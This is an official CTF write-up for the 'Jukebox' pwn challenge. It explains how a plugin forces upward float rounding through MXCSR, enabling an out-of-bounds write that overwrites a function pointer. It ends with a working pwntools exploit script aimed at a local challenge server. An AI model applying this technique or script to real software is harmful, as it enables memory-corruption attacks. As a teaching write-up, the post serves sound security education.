---
layout: post
title: "Jukebox — Official Writeup | BSides Fort Wayne 2026"
date: 2026-06-07
categories: [pwn]
---

## Challenge Info
```
This old jukebox has been sitting in the corner of the bar for thirty years. Knows every song ever made. Just punch in a number and it plays.

Last week the owner had some guy come in and swap out the sound card.
Said it'd make the bass hit harder. Nobody asked questions.

The jukebox only takes requests from 1 to 255. Always has. Always will.

Won't it?
```

Challenge Author: AbsoluteZer0

## Jukebox RE Part 1

After opening Jukebox the first thing the program does. It initializes the soundcard.so so lets go look at that and see what's going on.

```c
int64_t rax = dlopen("./soundcard.so", 2);
```

## Soundcard.so RE


```c
int64_t plugin_init(int32_t arg1 @ mxcsr) 
	int32_t var_1c_1 = (arg1 & 0xffff9fff) | 0x4000 return               fesetround(round: 0x800)
```

```c
fesetround(0x800) = FE_UPWARD
```

So the 13 and 14th bit of MXCSR are being manipulated to force rounding to move to positive infinity or in other words round up. Below is a table explaining what the different MXCSR bits are for. As you can see the 13th and 14th bits are for Rounding Control (RC) field.

### MXCSR Register Bits

| Bit   | Abbreviation | Name                   | Description                                                          |
| ----- | ------------ | ---------------------- | -------------------------------------------------------------------- |
| 0     | IE           | Invalid Operation Flag | Set when an invalid FP operation occurs (e.g. 0/0, sqrt of negative) |
| 1     | DE           | Denormal Flag          | Set when a denormal number is used as input                          |
| 2     | ZE           | Divide by Zero Flag    | Set when division by zero occurs                                     |
| 3     | OE           | Overflow Flag          | Set when result overflows the FP range                               |
| 4     | UE           | Underflow Flag         | Set when result is too small to represent                            |
| 5     | PE           | Precision Flag         | Set when result is not exactly representable                         |
| 6     | DAZ          | Denormals Are Zero     | Treats denormal inputs as zero instead of processing them            |
| 7     | IM           | Invalid Operation Mask | Masks (suppresses) invalid operation exceptions                      |
| 8     | DM           | Denormal Mask          | Masks denormal exceptions                                            |
| 9     | ZM           | Divide by Zero Mask    | Masks divide by zero exceptions                                      |
| 10    | OM           | Overflow Mask          | Masks overflow exceptions                                            |
| 11    | UM           | Underflow Mask         | Masks underflow exceptions                                           |
| 12    | PM           | Precision Mask         | Masks precision exceptions                                           |
| 13-14 | RC           | Rounding Control       | 00=nearest, 01=toward -inf, 10=toward +inf, 11=toward zero           |
| 15    | FZ           | Flush to Zero          | Flushes underflowing results to zero instead of generating denormals |
| 16-31 | -            | Reserved               | Unused, must be zero                                                 |

## Jukebox RE Part 2


```c
int64_t rax = dlopen("./soundcard.so", 2);
```

This initializes the plugin so before anything happens so if you didn't already reverse it this is a sign to go reverse it.

```nasm
0040123a  f30f2d45e0         cvtss2si eax, dword [rbp-0x20 {var_28_1}]
```

First we want to take a look at the above assembly the first thing to note is `cvtss2si` if you are unfamiliar we can use the intel software developers manual.

|                    | `CVTSS2SI`                              | `CVTTSS2SI`                                             |
| ------------------ | --------------------------------------- | ------------------------------------------------------- |
| Full name          | Convert Scalar Single to Signed Integer | Convert with Truncation Scalar Single to Signed Integer |
| Rounding mode      | From MXCSR RC field                     | Always truncate toward zero                             |
| Affected by plugin | **Yes**                                 | No                                                      |
| C equivalent       | `_mm_cvtss_si32()`                      | `(int)sample` or `truncf()`                             |

> **Key insight:** Under default conditions (RC=00) both instructions produce identical results for the same input — there is no observable difference until something modifies MXCSR. This is exactly why the plugin is the load-bearing piece of the challenge. A binary audited without reversing `soundcard.so` looks completely safe. The dangerous instruction is invisible without knowing the runtime FP state.

```nasm
00401247  488d0dd2220000     lea     rcx, [rel sample_buffer]
00401252  881408             mov     byte [rax+rcx], dl
```

`rax` holds the result of `cvtss2si` and `rcx` points to the base of `sample_buffer`, so the write lands at `sample_buffer[rax]`. When the rounding mode pushes `rax` to 248 or beyond, the write escapes the buffer and corrupts `fn_ptr`, which sits at a fixed recoverable offset in BSS (`fn_ptr - sample_buffer`), making the overwrite fully deterministic.

```c
    int32_t rax_7 = __isoc99_sscanf(&var_68, "%f %x", &var_6c, &var_70);
```

This identifies the next major part of the vulnerability. This is taking in a float and a hex byte.

```c
004011f7        float zmm0 = truncf(arg2);
004011f7        
00401212        if (!FCMP_UO(zmm0, arg2) && !(zmm0 != arg2))
0040121e            return puts("[-] No album found. Try 1-255.");

```
`truncf` guards against whole integers, forcing the solver to use floats, which is what makes the MXCSR rounding manipulation load-bearing.

## Exploit

After all that reversing we have enough information to understand we need a float and a hex byte to execute the OOB. As well is that the OOB is allowed because the MXCSR 13th and 14th bit get set to push rounding towards positive infinity. Then the math shows us that a float in the range of (N-1, N-0.5) rounds up to N and so since our buffer is 248 we need to do something like 247.4.

```python
from pwn import *
import struct

elf = ELF('./jukebox')

sample_buffer = elf.sym['sample_buffer']
fn_ptr        = elf.sym['fn_ptr']
win           = elf.sym['win']
offset        = fn_ptr - sample_buffer

log.info(f"sample_buffer: {hex(sample_buffer)}")
log.info(f"fn_ptr:        {hex(fn_ptr)}")
log.info(f"win:           {hex(win)}")
log.info(f"offset:        {offset}")

io = remote('localhost', 1337)

io.recvuntil(b'Press q to stop.')
io.recvline()

def magic_float_for(index):
    return float(index) - 0.6

for i, byte in enumerate(b'cat flag.txt\x00'):
    io.sendline(f'{magic_float_for(i+2)} {byte:02x}'.encode())
    io.recvuntil(b'Never Gonna Give You Up')
    io.recvline()

for i, byte in enumerate(p64(win)):
    io.sendline(f'{magic_float_for(offset + i)} {byte:02x}'.encode())
    io.recvuntil(b'Never Gonna Give You Up')
    io.recvline()

io.sendline(b'q')
print(io.recvall(timeout=5).decode())
```


## Closing remarks & Lessons learned

The key insight of this challenge is environmental trust. Most developers implicitly assume floating point rounding is standardized and consistent, but older systems, embedded targets, or any runtime where FP state is externally controlled can silently break that assumption. This causes code that looks safe to become exploitable. Reversing either binary in isolation tells you nothing until you account for the full runtime environment and then the vulnerability starts to surface.

#### Helpful Links
- [Intel® 64 and IA-32 Architectures Software Developer's Manual](https://www.intel.com/content/www/us/en/developer/articles/technical/intel-sdm.html) — Intel's SDM covers the MXCSR register and RC field in full detail as well as rounding modes and their encodings
- [felixcloutier.com — CVTSS2SI](https://www.felixcloutier.com/x86/cvtss2si) — SDM-derived reference for the instruction used as the exploitation primitive in this challenge
- [felixcloutier.com — CVTTSS2SI](https://www.felixcloutier.com/x86/cvttss2si) — The truncating variant for comparison, always rounds toward zero regardless of MXCSR state
